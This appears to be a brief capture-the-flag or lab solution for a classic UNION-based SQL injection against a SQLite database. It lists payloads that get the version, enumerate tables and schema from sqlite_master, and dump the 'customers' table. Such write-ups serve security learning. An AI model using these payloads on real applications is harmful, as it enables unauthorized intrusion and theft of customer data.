# ClassicSQLInjection

## Resolution

1. Find the number of columns queried.

```
'UNION SELECT sqlite_version(); --
'UNION SELECT 1,2,3,4,sqlite_version(); --
```

Gathered version: 3.41.1 

2. Find tables on the application

```
' UNION SELECT 1,2,3,4,tbl_name FROM sqlite_master WHERE type='table'; -- 
```

3. Find columns

```
' UNION SELECT 1,2,3,4,sql FROM sqlite_master WHERE name = 'customers'; --
```

4. Dump content from column 
```
' UNION SELECT 1,2,3,4,group_concat(name, '-') FROM customers;
```
